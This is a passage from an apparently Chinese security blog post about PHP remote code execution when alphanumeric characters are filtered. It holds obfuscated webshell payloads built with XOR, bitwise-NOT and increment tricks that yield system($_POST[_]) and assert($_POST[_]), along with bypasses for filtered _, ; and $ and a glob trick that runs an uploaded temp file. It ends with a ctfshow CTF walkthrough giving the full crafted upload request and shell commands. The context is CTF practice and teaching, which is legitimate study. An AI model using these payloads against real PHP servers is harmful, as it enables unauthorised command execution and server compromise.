class="comment">//得到&quot;T&quot;，此时$__=&quot;T&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSERT&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$____</span> = <span class="string">&quot;_&quot;</span>;   <span class="comment">//$____=&quot;_&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;P&quot;，此时$__=&quot;P&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_P&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;O&quot;，此时$__=&quot;O&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_PO&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;S&quot;，此时$__=&quot;S&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_POS&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;   <span class="comment">//得到&quot;T&quot;，此时$__=&quot;T&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_POST&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$$____</span>;   <span class="comment">//$_=$_POST</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);   <span class="comment">//ASSERT($POST[_])</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/11/18/HL68pxnvTZBG2ac.png" alt="20200805165424-430e5c2c-d6f9-1"></p>
<h2 id="PHP7"><a href="#PHP7" class="headerlink" title="PHP7"></a>PHP7</h2><p>PHP7中新增了函数动态调用：定义一个函数后，可以将函数名或者字符串赋值给一个变量；最后使用变量名代替函数名动态调用函数即可。比如，动态调用，可以用两种方法动态调用<code>md5()</code>函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> (<span class="string">&#x27;md5&#x27;</span>)(<span class="string">&#x27;123&#x27;</span>);</span><br><span class="line"><span class="variable">$func</span>=<span class="string">&#x27;md5&#x27;</span>;<span class="variable">$func</span>(<span class="string">&#x27;123&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/11/18/1n3odWxJaLKFVPN.png" alt="image-20231115164947854"></p>
<p>有了函数动态调用，就可以更方便的进行异或和取反操作了。</p>
<h3 id="异或-1"><a href="#异或-1" class="headerlink" title="异或"></a>异或</h3><p>可以利用异或脚本，获取任意想要的字符串：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;phpinfo&quot;</span>;<span class="comment">//想要异或得到的字符串</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;%&quot;</span>.<span class="title function_ invoke__">dechex</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$a</span>[<span class="variable">$i</span>])^<span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;^&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;%ff&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>演示：</p>
<p>使用异或脚本获取：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpinfo:%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff</span><br><span class="line">(%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff)()//相当于(&#x27;phpinfo&#x27;)()，执行了phpinfo()</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/11/18/D5TbSzqZkdflN3h.png" alt="image-20231115165424122"></p>
<h3 id="取反-1"><a href="#取反-1" class="headerlink" title="取反"></a>取反</h3><p>可以利用取反脚本，获取任意想要的字符串：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;system&quot;</span>;<span class="comment">//想要取反的字符串</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;~&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;%&quot;</span>.<span class="title function_ invoke__">bin2hex</span>(~<span class="variable">$a</span>[<span class="variable">$i</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//echo &quot;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>演示：</p>
<p>使用取反脚本获取：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpinfo:~%8F%97%8F%96%91%99%90</span><br><span class="line">system:~%8c%86%8c%8b%9a%92</span><br><span class="line">whoami:~%88%97%90%9e%92%96</span><br><span class="line">//可以得到</span><br><span class="line">system(&#x27;whoami&#x27;):(~%8c%86%8c%8b%9a%92)(~%88%97%90%9e%92%96)//相当于(&#x27;system&#x27;)(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/11/18/s2IMFQfh4tYVXeU.png" alt="image-20231115170055796"></p>
<p>注意：</p>
<p><code>eval</code>和<code>echo</code>不是PHP函数，不能被拼接调用或者动态调用。</p>
<p><code>assert</code>在php5中是函数，可以拼接调用；但在php7.1中不是函数，就和<code>eval</code>一样了。</p>
<p>用汉字取反：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=[]; <span class="comment">//array</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>; <span class="comment">//arrayarray</span></span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$_</span>==<span class="variable">$__</span>); <span class="comment">//$_=(array==arrayarray) false 0</span></span><br><span class="line"><span class="variable">$__</span>=(<span class="variable">$_</span>==<span class="variable">$_</span>); <span class="comment">//$__=(array==array) true 1</span></span><br><span class="line"><span class="variable">$___</span>=~区[<span class="variable">$__</span>].~冈[<span class="variable">$__</span>].~区[<span class="variable">$__</span>].~勺[<span class="variable">$__</span>].~皮[<span class="variable">$__</span>].~针[<span class="variable">$__</span>]; <span class="comment">//system</span></span><br><span class="line"><span class="variable">$____</span>=~码[<span class="variable">$__</span>].~寸[<span class="variable">$__</span>].~小[<span class="variable">$__</span>].~欠[<span class="variable">$__</span>].~立[<span class="variable">$__</span>]; <span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$$____</span>[_]); <span class="comment">//system($_POST[_]);</span></span><br><span class="line"><span class="comment">//写在一行，得到payload：system($_POST[_])</span></span><br><span class="line"><span class="variable">$_</span>=[];<span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>;<span class="variable">$_</span>=(<span class="variable">$_</span>==<span class="variable">$__</span>);<span class="variable">$__</span>=(<span class="variable">$_</span>==<span class="variable">$_</span>);<span class="variable">$___</span>=~区[<span class="variable">$__</span>].~冈[<span class="variable">$__</span>].~区[<span class="variable">$__</span>].~勺[<span class="variable">$__</span>].~皮[<span class="variable">$__</span>].~针[<span class="variable">$__</span>];<span class="variable">$____</span>=~码[<span class="variable">$__</span>].~寸[<span class="variable">$__</span>].~小[<span class="variable">$__</span>].~欠[<span class="variable">$__</span>].~立[<span class="variable">$__</span>];<span class="variable">$___</span>(<span class="variable">$$____</span>[_]);</span><br></pre></td></tr></table></figure>

<h2 id="各种过滤和绕过"><a href="#各种过滤和绕过" class="headerlink" title="各种过滤和绕过"></a>各种过滤和绕过</h2><h3 id="过滤了"><a href="#过滤了" class="headerlink" title="过滤了_"></a>过滤了<code>_</code></h3><p>在我们上面的例子中，<code>_</code>的主要用途就是在构造变量。但其实最简便的方法里面，我们可以完全不用<code>_</code>，这里给出一个例子。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`&#123;$&#123;~<span class="string">&quot;%a0%b8%ba%ab&quot;</span>&#125;[%a0]&#125;`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析下这个Payload，<code>?&gt;</code>闭合了eval自带的<code>&lt;?</code>标签。接下来使用了短标签。<code>&#123;&#125;</code>包含的PHP代码可以被执行，<code>~&quot;%a0%b8%ba%ab&quot;</code>为<code>&quot;_GET&quot;</code>，通过反引号进行shell命令执行。最后我们只要GET传参<code>%a0</code>即可执行命令。</p>
<p><img src="https://s2.loli.net/2023/11/18/w2jpKGTMUrkmBSx.png" alt="20200805165502-59635bd0-d6f9-1"></p>
<h3 id="过滤了-1"><a href="#过滤了-1" class="headerlink" title="过滤了;"></a>过滤了<code>;</code></h3><p>分号我们只是用在结束PHP语句上，我们只要把所有的PHP语句改成短标签形式，就可以不使用<code>;</code>了。</p>
<h3 id="过滤了-2"><a href="#过滤了-2" class="headerlink" title="过滤了$"></a>过滤了<code>$</code></h3><p>过滤了<code>$</code>的影响是我们彻底不能构造变量了。</p>
<h4 id="PHP7-1"><a href="#PHP7-1" class="headerlink" title="PHP7"></a>PHP7</h4><p>在PHP7中，我们可以使用<code>($a)()</code>这种方法来执行命令。</p>
<p>这里我使用<code>call_user_func()</code>来举例(不使用<code>assert()</code>的原因上面已经解释过)。<br>我构造了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">shell=(~%<span class="number">9</span>c%<span class="number">9</span>e%<span class="number">93</span>%<span class="number">93</span>%a0%<span class="number">8</span>a%<span class="number">8</span>c%<span class="number">9</span>a%<span class="number">8</span>d%a0%<span class="number">99</span>%<span class="number">8</span>a%<span class="number">91</span>%<span class="number">9</span>c(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>,~%<span class="number">88</span>%<span class="number">97</span>%<span class="number">90</span>%<span class="number">9</span>e%<span class="number">92</span>%<span class="number">96</span>,<span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>其中<code>~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c</code>是”<code>call_user_func</code>“，<code>~%8c%86%8c%8b%9a%92</code>是”<code>system</code>“，<code>~%88%97%90%9e%92%96</code>是”<code>whoami</code>“。</p>
<p>或者我们可以通过<code>(&#39;phpinfo&#39;)();</code>来执行函数，第一个括号中可以是任意PHP表达式。</p>
<p>所以很简单了，构造一个可以生成<code>phpinfo</code>这个字符串的PHP表达式即可。payload如下（不可见字符用url编码表示）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell=(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>

<h4 id="PHP5-1"><a href="#PHP5-1" class="headerlink" title="PHP5"></a>PHP5</h4><p>开头先贴一篇P神的文章：</p>
<p>接下来是自我总结的，实在不行再去看看原文。</p>
<p>php5并不支持php7这种表达方式。</p>
<p>先写两个有趣的Linux shell知识点：</p>
<ul>
<li>shell下可以利用 <code>.</code> 来执行任意脚本</li>
<li>Linux文件名支持用glob通配符代替</li>
</ul>
<p>先贴wp：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=?&gt;&lt;?=`.+/???/????????[@-[]`;?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="构造原理："><a href="#构造原理：" class="headerlink" title="构造原理："></a>构造原理：</h5><h6 id=""><a href="#" class="headerlink" title="&lt;?= ?&gt;"></a><code>&lt;?= ?&gt;</code></h6><p>在php中，<code>&lt;? ?&gt;</code>称为短标签，<code>&lt;?php ?&gt;</code>称为长标签。修改PHP.ini文件配置 <code>short_open_tag = On</code> 才可使用短标签。php5.4.0以后， <code>&lt;?= </code>总是可代替 <code>&lt;? echo</code>。</p>
<h6 id="反引号"><a href="#反引号" class="headerlink" title="反引号&#96;&#96;"></a>反引号&#96;&#96;</h6><p>在php中反引号的作用是命令替换，将其中的字符串当成shell命令执行，返回命令的执行结果。反引号包括的字符串必须是能执行的shell命令，否则会出错。</p>
<h6 id="-1"><a href="#-1" class="headerlink" title="."></a><code>.</code></h6><p><code>.</code>或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则<code>. file</code>的意思就是用bash执行file文件中的命令。</p>
<p>用<code>. file</code>执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用<code>.</code>来执行它了吗？</p>
<h6 id="加号"><a href="#加号" class="headerlink" title="加号 +"></a>加号 <code>+</code></h6><p>URL编码中空格为<code>%20</code>，<code>+</code>表示为<code>%2B</code>。然而url中<code>+</code>也可以表示空格，要表示<code>+</code>号必须得用<code>%2B</code>。</p>
<h6 id="匹配文件名"><a href="#匹配文件名" class="headerlink" title="匹配文件名"></a>匹配文件名</h6><p>这个文件也很好得到，我们可以发送一个上传文件的POST包，在linux系统下，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</p>
<p><code>*</code>星号，匹配任何字符，<code>?</code> 问号，匹配任意一个字符</p>
<p>那么，<code>/tmp/phpXXXXXX</code>就可以表示为<code>/*/?????????</code>或<code>/???/?????????</code>。</p>
<p>但我们尝试执行<code>. /???/?????????</code>，却得到如下错误：</p>
<p><img src="https://s2.loli.net/2023/11/18/wlA7FbxYuyGpiMs.png" alt="img"></p>
<p>这是因为，能够匹配上<code>/???/?????????</code>这个通配符的文件有很多，我们可以列出来：</p>
<p><img src="https://s2.loli.net/2023/11/18/1MuRev5ANV6BGSm.png" alt="image.png"></p>
<p>可见，我们要执行的<code>/tmp/phpcjggLC</code>排在倒数第二位。然而，在执行第一个匹配上的文件（即<code>/bin/run-parts</code>）的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。</p>
<p>我们可以利用<code>[@-[]</code>来表示大写字母：</p>
<p><img src="https://s2.loli.net/2023/11/18/TR3CqlYkZm92UK4.png" alt="image.png"></p>
<p>当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</p>
<p>发送数据包如下（在burp伪造上传）：</p>
<p><img src="https://www.leavesongs.com/media/attachment/2018/10/06/56de7887-0a22-4b06-9ccd-2951a4bdab4c.624e7ada5f87.png" alt="image.png"></p>
<p>成功执行任意命令。</p>
<h5 id="小小例题"><a href="#小小例题" class="headerlink" title="小小例题"></a>小小例题</h5><p>[ctfshow] 红包题第二弹</p>
<p>点开一看什么也没有</p>
<p><img src="https://s2.loli.net/2023/11/18/N2slPLT4Xwphk1W.png" alt="image-20231118221512566"></p>
<p>惯例先查看源代码，发现hint</p>
<p><img src="https://s2.loli.net/2023/11/18/4MFmWbe3Ix2JSAn.png" alt="image-20231118221556502"></p>
<p>GET任意cmd，得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cerror&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;serror&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">     &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码审计，要求cmd不能含有除了p以外的大小写字母和数字，且不能含有特殊字符：$~!@#%^&amp;等等，可惜不能用p神匹配大写的方法</p>
<p>但是我们知道临时文件存放地址在tmp目录，且以php开头，恰好本题没有过滤p</p>
<p>故我们可以构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=`.+/??p/p?p??????`;</span><br></pre></td></tr></table></figure>

<p>但是我们还要伪造上传，以上请求头修改了3个地方：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`; HTTP/1.1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------10242300956292313528205888</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;1.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"> </span><br><span class="line">#! /bin/sh</span><br><span class="line"> </span><br><span class="line">ls /</span><br><span class="line">-----------------------------10242300956292313528205888--</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/11/19/hTQJEnGds5X6c83.png" alt="屏幕截图 2023-11-19 083136"></p>
<p>发现<code>flag.txt</code>，将<code>ls /</code>改为<code>cat flag.txt</code></p>
<p><img src="https://s2.loli.net/2023/11/19/RLoFs8nHp13V5TU.png" alt="屏幕截图 2023-11-19 083203"></p>
<p><strong>Content-Type</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>

<p>(默认值) ：上传键值对</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">multipart/form-data</span><br></pre></td></tr></table></figure>

<p>上传文件</p>
<p><strong>boundary</strong></p>
<p>boundary为边界分隔符</p>
<pre><code>文件开始标记：-----------------------------10242300956292313528205888

文件结束标记：-----------------------------10242300956292313528205888--

其中10242300956292313528205888是浏览器随机生成的，只要足够复杂就可以。
</code></pre>
<p><strong>文件内容</strong></p>
<p><code>#! /bin/sh </code>指定命令解释器，<code>#!</code>是一个特殊的表示符，其后，跟着解释此脚本的shell路径。bash只是shell的一种，还有很多其它shell，如：<code>sh,csh,ksh,tcsh。</code>首先用命令 <code>ls / </code> 来查看服务器根目录有哪些文件，发现有<code>flag.txt</code>，然后再用 <code>cat /flag.txt</code> 即可。</p>
<p>当然，也可以构造一个前端上传的html页面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;File Upload&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   &lt;h1&gt;Welcome to Tutorials Point&lt;/h1&gt;</span><br><span class="line">   &lt;form action=&quot;http://13f4152e-6ad9-4586-b8d0-c26c0c2c2a45.challenge.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;file&quot; name=&quot;uploadedFile&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span><br><span class="line">   &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>上传一个txt文档，用burp抓包，在改文件内容和cmd的值就行了</p>
<p><img src="https://s2.loli.net/2023/11/19/xVkav6YIHjKfgXN.png" alt="image-20231119172006358"></p>
]]></content>
      <categories>
        <category>命令执行</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
</search>
